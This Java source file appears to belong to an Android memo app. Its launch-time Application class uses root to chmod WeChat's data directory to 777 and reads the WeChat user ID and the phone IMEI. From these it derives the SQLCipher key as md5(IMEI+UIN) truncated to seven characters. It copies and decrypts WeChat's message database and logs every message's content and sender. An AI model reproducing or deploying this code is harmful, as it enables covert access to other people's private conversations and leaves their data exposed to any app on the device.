package cn.jsbintask.memo.weixin;


import android.app.Application;
import android.content.Context;
import android.database.Cursor;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.dom4j.Document;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import cn.jsbintask.memo.Constants;
import cn.jsbintask.memo.entity.Event;
import cn.jsbintask.memo.manager.ClockManager;
import cn.jsbintask.memo.manager.EventManager;
import cn.jsbintask.memo.util.DateTimeUtil;

public class WeixinApplication extends Application
{
    public static final String WX_ROOT_PATH = "/data/data/com.tencent.mm/";
    private static final String WX_SP_UIN_PATH = WX_ROOT_PATH + "shared_prefs/auth_info_key_prefs.xml";
    private static final String WX_DB_DIR_PATH = WX_ROOT_PATH + "MicroMsg";
    private List<File> mWxDbPathList;
    private static final String WX_DB_FILE_NAME = "EnMicroMsg.db";
    private String mCurrApkPath;
    private static final String COPY_WX_DATA_DB = "wx_data.db";
    //    private Context context;
    private static Context context;
    private String mCurrWxUin;
    private String mDbPassword;
    private String mPhoneIMEI;
    private String userNameTest;
    private JSONObject Json;

    private EventManager mEventManager = EventManager.getInstance();
    private ClockManager mClockManager = ClockManager.getInstance();

    @Override
    public void onCreate()
    {

        context=getApplicationContext();
        super.onCreate();
        execRootCmd("chmod 777 -R " + WX_ROOT_PATH);//出錯
        mWxDbPathList= new ArrayList<>();
        mWxDbPathList.clear();
        File wxDataDir = new File(WX_DB_DIR_PATH);
        searchFile(wxDataDir, WX_DB_FILE_NAME);//mWxDbPathList

        initCurrWxUin();
        initPhoneIMEI();
        initDbPassword(mPhoneIMEI,mCurrWxUin);
        mCurrApkPath= "/data/data/" + WeixinApplication.getContextObject().getPackageName() + "/";
        //        处理多账号登陆情况
        for (int i = 0; i < mWxDbPathList.size(); i++) {
            File file = mWxDbPathList.get(i);
            String copyFilePath = mCurrApkPath + COPY_WX_DATA_DB;
            //将微信数据库拷贝出来，因为直接连接微信的db，会导致微信崩溃
            copyFile(file.getAbsolutePath(), copyFilePath);
            File copyWxDataDb = new File(copyFilePath);
            openWxDb(copyWxDataDb);


            Event event = new Event();

            event.setmRemindTime(DateTimeUtil.dateToStr(new Date()));
            event.setmTitle("test");
            event.setmIsImportant(Constants.EventFlag.NORMAL);
            event.setmContent("content test");
            event.setmUpdatedTime(DateTimeUtil.dateToStr(new Date()));

            mEventManager.saveOrUpdate(event);


        }

    }


    public static Context getContextObject(){
        return context;
    }
    public JSONObject getJson(){
        return Json;
    }
    public String getmCurrWxUin(){
        return mCurrWxUin;
    }
    public String getmDbPassword(){return mDbPassword;}
    public String getUserNameTest(){return userNameTest;}
    public void execRootCmd(String paramString) {
        try {
            Process localProcess = Runtime.getRuntime().exec("su");
            Object localObject = localProcess.getOutputStream();
            DataOutputStream localDataOutputStream = new DataOutputStream((OutputStream) localObject);
            String str = String.valueOf(paramString);
            localObject = str + "\n";
            localDataOutputStream.writeBytes((String) localObject);
            localDataOutputStream.flush();
            localDataOutputStream.writeBytes("exit\n");
            localDataOutputStream.flush();
            localProcess.waitFor();
            localObject = localProcess.exitValue();
        } catch (Exception localException) {
            localException.printStackTrace();
        }


    }
    private void initPhoneIMEI() {
        TelephonyManager tm = (TelephonyManager) WeixinApplication.getContextObject().getSystemService(TELEPHONY_SERVICE);
        mPhoneIMEI = tm.getDeviceId();
    }
    public String getmPhoneIMEI(){
        return mPhoneIMEI;
    }

    private void initCurrWxUin() {

        File file = new File(WX_SP_UIN_PATH);
        try {
            FileInputStream in = new FileInputStream(file);
            SAXReader saxReader = new SAXReader();
            Document document = saxReader.read(in);
            Element root = document.getRootElement();
            List<Element> elements = root.elements();
            for (Element element : elements) {
                if ("_auth_uin".equals(element.attributeValue("name"))) {
                    mCurrWxUin = element.attributeValue("value");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            //            LogUtil.log("获取微信uid失败，请检查auth_info_key_prefs文件权限");
        }
    }

    private void initDbPassword(String imei, String uin) {
        if (TextUtils.isEmpty(imei) || TextUtils.isEmpty(uin)) {
            //            LogUtil.log("初始化数据库密码失败：imei或uid为空");
            return;
        }
        String md5 = md5(imei + uin);
        mDbPassword = md5.substring(0, 7).toLowerCase();

    }

    private String md5(String content) {
        MessageDigest md5 = null;
        try {
            md5 = MessageDigest.getInstance("MD5");
            md5.update(content.getBytes("UTF-8"));
            byte[] encryption = md5.digest();//加密
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < encryption.length; i++) {
                if (Integer.toHexString(0xff & encryption[i]).length() == 1) {
                    sb.append("0").append(Integer.toHexString(0xff & encryption[i]));
                } else {
                    sb.append(Integer.toHexString(0xff & encryption[i]));
                }
            }
            return sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    private void searchFile(File file, String fileName) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files != null) {
                for (File childFile : files) {
                    searchFile(childFile, fileName);
                }
            }
        } else {
            if (fileName.equals(file.getName())) {
                mWxDbPathList.add(file);
                Log.d("log",file.getName());
            }
        }
    }



    public void copyFile(String oldPath, String newPath) {
        try {
            int byteRead = 0;
            File oldFile = new File(oldPath);
            if (oldFile.exists()) { //文件存在时
                InputStream inStream = new FileInputStream(oldPath); //读入原文件
                FileOutputStream fs = new FileOutputStream(newPath);
                byte[] buffer = new byte[1444];
                while ((byteRead = inStream.read(buffer)) != -1) {
                    fs.write(buffer, 0, byteRead);
                }
                inStream.close();
            }
        } catch (Exception e) {
            System.out.println("复制单个文件操作出错");
            e.printStackTrace();

        }
    }

    private void openWxDb(File dbFile) {
        Context context = WeixinApplication.getContextObject();
        SQLiteDatabase.loadLibs(context);

        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;"); //兼容2.0的数据库
            }
        };

        try {
            //打开数据库连接
            SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, mDbPassword, null, hook);
            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2）
            int count=0;
            Cursor c=db.rawQuery("select * from message",null);
            //            Cursor c1 = db.rawQuery("select * from rcontact where verifyFlag = 0 and type != 4 and type != 2 and nickname != '' limit 20, 9999", null);
            //            while (c1.moveToNext()) {
            //                userNameTest=nickName;
            //                String userName = c1.getString(c1.getColumnIndex("username"));
            //                String alias = c1.getString(c1.getColumnIndex("alias"));
            //                String nickName = c1.getString(c1.getColumnIndex("nickname"));
            //
            //            }
            while (c.moveToNext()) {
                long _id = c.getLong(c.getColumnIndex("msgId"));
                String content = c.getString(c.getColumnIndex("content"));
                int type = c.getInt(c.getColumnIndex("type"));
                String talker = c.getString(c.getColumnIndex("talker"));
                long time = c.getLong(c.getColumnIndex("createTime"));
                //                JSONObject tmpJson = handleJson(count,_id, content, type, talker, time);
                //                Json.put("data" + count, tmpJson);
                Log.i("WxMessage",content);
                Log.i("WxMessage",talker);
                count++;
            }
            c.close();
            db.close();
            //            Log.e("readWxDatanases", "读取结束:" + System.currentTimeMillis() + ",count:" + count);
            //        }
            ////            c1.close();
            ////            db.close();
        } catch (Exception e) {
            //            LogUtil.log("读取数据库信息失败" + e.toString());
            e.printStackTrace();
        }
    }
}